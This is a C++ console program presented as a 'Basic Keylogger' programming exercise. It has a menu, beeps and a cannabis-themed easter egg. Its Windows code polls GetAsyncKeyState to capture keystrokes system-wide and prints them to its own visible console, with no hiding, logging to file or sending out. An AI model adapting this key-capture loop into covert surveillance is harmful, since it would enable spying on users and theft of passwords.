/*
    --------------------------------------------
                    Includes
    --------------------------------------------
*/
#include <iostream>
#include <string>
#include <cstdlib>
#include <climits>
#include <thread>
#include <chrono>

#ifdef _WIN32
    #include <windows.h>
    #define CLEAR_CMD "CLS"
    void setConsoleTitle(const char* title) { SetConsoleTitleA(title); }
    void beep(int freq, int dur) { Beep(freq, dur); }
#else
    #include <termios.h>
    #include <unistd.h>
    #include <signal.h>
    #define CLEAR_CMD "clear"
    void setConsoleTitle(const char* title) {
        std::cout << "\033]0;" << title << "\007";
    }
    void beep(int freq, int dur) {
        // Crossplatform alternative: ASCII bell, may not honor frequency/duration
        std::cout << "\a" << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(dur));
    }
#endif

/*
    --------------------------------------------
                    Globals
    --------------------------------------------
*/
int choice = 0;
bool running = true;

/*
    --------------------------------------------
                    Declarations
    --------------------------------------------
*/
void mainMenu();

void startScreen();
void aboutScreen();
void errorScreen();
void exitScreen();

void weedEasterEgg();

void keyLogger();

/*
    --------------------------------------------
                    Main
    --------------------------------------------
*/
int main(int argc, char** argv)
{
    beep(170, 100);
    beep(170, 200);
    beep(170, 300);
    beep(400, 50);

    setConsoleTitle("Basic Keylogger (Crossplatform)");

    while (running) {
        mainMenu();
    }

    return 0;
}

/*
    --------------------------------------------
                    Main Menu Logic
    --------------------------------------------
*/
void mainMenu()
{
    std::cout << "\n";
    std::cout << "Basic Keylogger\n";
    std::cout << "\n";
    std::cout << "1.) Start Keylogger\n";
    std::cout << "2.) About / Information\n";
    std::cout << "3.) Quit\n";
    std::cout << "\n";
    std::cout << ">: ";

    std::cin >> choice;
    std::cin.ignore(INT_MAX, '\n');

    switch (choice) {
    case 1:
        startScreen();
        break;
    case 2:
        aboutScreen();
        break;
    case 3:
        exitScreen();
        break;
    case 420:
        weedEasterEgg();
        break;
    default:
        errorScreen();
        break;
    }
}

/*
    --------------------------------------------
                    Menu Screens
    --------------------------------------------
*/
void startScreen()
{
    setConsoleTitle("Capturing keypresses.....");
    system(CLEAR_CMD);

    keyLogger();

    std::cin.clear();
    std::cout << "\n\nPRESS ENTER KEY TO GO BACK!";
    std::cin.get();

    setConsoleTitle("Basic Keylogger (Crossplatform)");
    system(CLEAR_CMD);
}

void aboutScreen()
{
    beep(420, 100);

    setConsoleTitle("About Basic Keylogger");
    system(CLEAR_CMD);

    std::cout << "Developer :: Zachary Tancrell" << std::endl;
    std::cout << std::endl;
    std::cout << "About :: \n - This is a C++ console keylogger made as a programming exercise.\n";
    std::cout << "   - Did you find the easter eggs? ;)\n";

    std::cout << "\n\nPRESS ENTER KEY TO GO BACK!";
    std::cin.get();

    setConsoleTitle("Basic Keylogger (Crossplatform)");
    system(CLEAR_CMD);
}

void errorScreen()
{
    beep(420, 200);
    beep(69, 200);

    setConsoleTitle("Invalid Option");
    system(CLEAR_CMD);
    std::cout << "Invalid option selected. Please try again.\n";

    std::cout << "\n\nPRESS ENTER KEY TO GO BACK!";
    std::cin.get();

    setConsoleTitle("Basic Keylogger (Crossplatform)");
    system(CLEAR_CMD);
}

void exitScreen()
{
    beep(911, 200);
    beep(911, 200);

    running = false;
#ifdef _WIN32
    exit(0);
#endif
}

/*
    ----------------------------------------------
                Easter Eggs
    ----------------------------------------------
*/
void weedEasterEgg()
{
    std::cout << "Looks like you have found one of my easter eggs...\n";
    std::cout << "Why don't you just relax and chill out?\n";
    std::cout << "What strain is your favorite?\n";
    std::cout << R"(
                     .                          
                     M                          
                    dM                          
                    MMr                         
                   4MMML                  .     
                   MMMMM.                xf     
   .              "MMMMM               .MM-     
    Mh..          +MMMMMM            .MMMM      
    .MMM.         .MMMMML.          MMMMMh      
     )MMMh.        MMMMMM         MMMMMMM       
      3MMMMx.     'MMMMMMf      xnMMMMMM"       
      '*MMMMM      MMMMMM.     nMMMMMMP"        
        *MMMMMx    "MMMMM\    .MMMMMMM=         
         *MMMMMh   "MMMMM"   JMMMMMMP           
           MMMMMM   3MMMM.  dMMMMMM            .
            MMMMMM  "MMMM  .MMMMM(        .nnMP"
=..          *MMMMx  MMM"  dMMMM"    .nnMMMMM*  
  "MMn...     'MMMMr 'MM   MMM"   .nMMMMMMM*"   
   "4MMMMnn..   *MMM  MM  MMP"  .dMMMMMMM""     
     ^MMMMMMMMx.  *ML "M .M*  .MMMMMM**"        
        *PMMMMMMhn. *x > M  .MMMM**""           
           ""**MMMMhx/.h/ .=*"                  
                    .3P"%....                   
                  nP"     "*MMnx
)" << '\n';

    std::cout << "I will now self destruct in 10 seconds...\n";
    for (int num = 10; num > 0; --num) {
        beep(420, 100);
        std::cout << "Time left: " << num << " \r" << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(800));
    }
    std::cout << "\nSelf-destruct sequence completed!\n";
}

/*
    ----------------------------------------------
                    KeyLogger Logic
    ----------------------------------------------
*/
#ifdef _WIN32

void keyLogger()
{
    std::cout << "[Windows] Press ESC to stop logging.\n";
    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                switch (key) {
                case VK_SPACE:      std::cout << "[SPACE]\n"; break;
                case VK_RETURN:     std::cout << "[RETURN]\n"; break;
                case VK_SHIFT:      std::cout << "[SHIFT]\n"; break;
                case VK_BACK:       std::cout << "[BACKSPACE]\n"; break;
                case VK_TAB:        std::cout << "[TAB]\n"; break;
                case VK_CAPITAL:    std::cout << "[CAPS LOCK]\n"; break;
                case VK_CONTROL:    std::cout << "[CTRL]\n"; break;
                case VK_LWIN:
                case VK_RWIN:       std::cout << "[WIN]\n"; break;
                case VK_MENU:       std::cout << "[ALT]\n"; break;
                case VK_UP:         std::cout << "[UP]\n"; break;
                case VK_LEFT:       std::cout << "[LEFT]\n"; break;
                case VK_DOWN:       std::cout << "[DOWN]\n"; break;
                case VK_RIGHT:      std::cout << "[RIGHT]\n"; break;
                case VK_ESCAPE:     std::cout << "[ESCAPE]\n"; return;
                default:
                    if ((key >= 32 && key <= 126))
                        std::cout << char(key) << '\n';
                    else
                        std::cout << "[KEY: " << key << "]\n";
                    break;
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(60));
            }
        }
    }
}
#else

void restoreTerminal(struct termios* oldt) {
    tcsetattr(STDIN_FILENO, TCSANOW, oldt);
}

void keyLogger()
{
    std::cout << "[Linux/macOS] Press ESC to stop logging.\n";
    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    auto cleanup = [&]() { restoreTerminal(&oldt); };
    signal(SIGINT, [](int) { std::cout << "\n[EXIT]\n"; exit(0); });

    int ch;
    while (true) {
        ch = getchar();
        if (ch == 27) { // ESC
            std::cout << "[ESCAPE]\n";
            break;
        } else if (ch == 10) {
            std::cout << "[RETURN]\n";
        } else if (ch == 32) {
            std::cout << "[SPACE]\n";
        } else if (ch >= 32 && ch <= 126) {
            std::cout << char(ch) << '\n';
        } else {
            std::cout << "[KEY: " << ch << "]\n";
        }
    }
    cleanup();
}
#endif
